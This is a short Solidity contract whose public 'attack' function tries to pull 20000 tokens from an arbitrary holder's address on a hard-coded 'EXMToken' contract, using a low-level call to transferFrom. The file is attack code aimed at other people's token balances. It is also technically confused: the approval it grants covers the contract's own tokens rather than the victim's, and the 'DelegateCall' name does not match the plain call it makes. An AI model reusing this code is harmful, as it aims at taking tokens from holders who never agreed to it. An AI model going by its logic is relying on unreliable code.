// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface EXMToken {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract DelegateCall {
    EXMToken public tokenContract;
    address public exmTokenAddress;

    constructor() {
        exmTokenAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c;
        tokenContract = EXMToken(exmTokenAddress);
    }
function attack(address tokenHolder) public {
    require(tokenContract.approve(address(this), 20000), "Approval failed");

    bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", tokenHolder, exmTokenAddress, 20000);
    (bool success, ) = address(tokenContract).call(data);
    require(success, "call failed");
}


}